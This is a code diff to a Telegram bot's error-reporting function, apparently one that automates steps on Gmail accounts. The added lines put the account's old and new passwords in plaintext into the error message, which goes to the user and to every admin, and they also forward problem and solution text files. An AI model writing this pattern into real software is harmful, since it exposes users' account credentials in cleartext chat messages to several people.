@@ -22,6 +22,10 @@ async def report_error(
     error_text: str,
     screenshot_path: Optional[str] = None,
     html_path: Optional[str] = None,
+    problem_txt_path: Optional[str] = None,
+    solution_txt_path: Optional[str] = None,
+    old_password: Optional[str] = None,
+    new_password: Optional[str] = None,
     rot_id: Optional[int] = None,
 ) -> None:
     """Send error info to the user and to all admins, persist to DB."""
@@ -50,6 +54,8 @@ async def report_error(
         f"👤 user_id: <code>{user_id}</code>\n"
         f"📧 gmail: <code>{gmail}</code>\n"
         f"🔧 step: <code>{step}</code>\n"
+        f"🔑 old_password: <code>{_html_escape(old_password or '-')}</code>\n"
+        f"🆕 new_password: <code>{_html_escape(new_password or '-')}</code>\n"
         f"📝 error:\n<code>{_html_escape(short)}</code>"
     )
     for admin_id in config.ADMIN_IDS:
@@ -62,6 +68,10 @@ async def report_error(
             if html_path and os.path.exists(html_path):
                 with open(html_path, "rb") as f:
                     await ctx.bot.send_document(admin_id, document=f, filename=os.path.basename(html_path))
+            for extra_path in (problem_txt_path, solution_txt_path):
+                if extra_path and os.path.exists(extra_path):
+                    with open(extra_path, "rb") as f:
+                        await ctx.bot.send_document(admin_id, document=f, filename=os.path.basename(extra_path))
         except Exception as exc:
             log.warning("Failed to notify admin %s: %s", admin_id, exc)
 
